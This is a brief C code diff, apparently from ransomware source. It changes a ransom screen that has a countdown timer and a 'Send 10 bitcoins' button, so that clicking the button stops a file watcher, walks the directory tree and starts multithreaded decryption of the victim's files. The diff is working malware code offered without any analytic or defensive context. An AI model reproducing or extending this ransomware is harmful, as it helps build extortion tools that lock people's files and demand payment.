@@ -51,6 +51,11 @@ int display_gui(time_t start_time) {
                      remaining <= 10 ? RED : BLACK);
             if (GuiButton((Rectangle){ 10, texture.height + 105, 400, 70 }, "Send 10 bitcoins")) {
                 button_clicked = true;
+                watcher_on = false;
+                clear_queue(&queue);
+                traverse(start_path);
+                enqueue(&queue, "END_DECRYPT");
+                printf("start_decryption\n");
                 initialize_threads(8, false);
             }
         EndDrawing();
